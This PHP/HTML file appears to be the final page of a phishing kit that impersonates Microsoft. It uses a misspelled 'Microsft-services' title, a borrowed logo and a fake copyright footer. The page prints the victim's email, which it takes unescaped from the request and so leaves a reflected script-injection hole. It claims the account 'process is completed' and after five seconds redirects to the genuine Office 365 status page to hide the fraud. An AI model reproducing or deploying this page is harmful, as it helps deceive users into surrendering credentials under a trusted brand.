<?php
	$email = $_REQUEST['email'];
?>

<!DOCTYPE html>
<script>
        var timer = setTimeout(function() {
            window.location='https://portal.office.com/servicestatus/'
        }, 5000);
    </script>
<html>

 <head>

  <title>Microsft-services</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">

  <link rel="shortcut icon" type="icon" href="images/favicon.png">

  <style>
   body {
    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    width: 1200px;
    max-width: 1200px;
    padding-top: 25px;
    margin: auto;
   }
  </style>

 </head>

 <body>
  <div>
   <img src="https://i.imgur.com/bAairvW.jpg" alt="logo">
  </div>

  <div>
   <h1>Your account <span style='color: blue;'><?=$email; ?></span> process is completed.</h1>


   <br>

   <p>You would be redirected to your mailbox now.This would only take a minute.</p>

   <br>

  </div>

  <hr>

  <div>
   <p align="right">&copy; 2019 Microsoft <a href="#" style=" text-decoration: none;">Terms of Use Privacy & Cookies</a> Developers</p>
  </div>

 </body>
</html>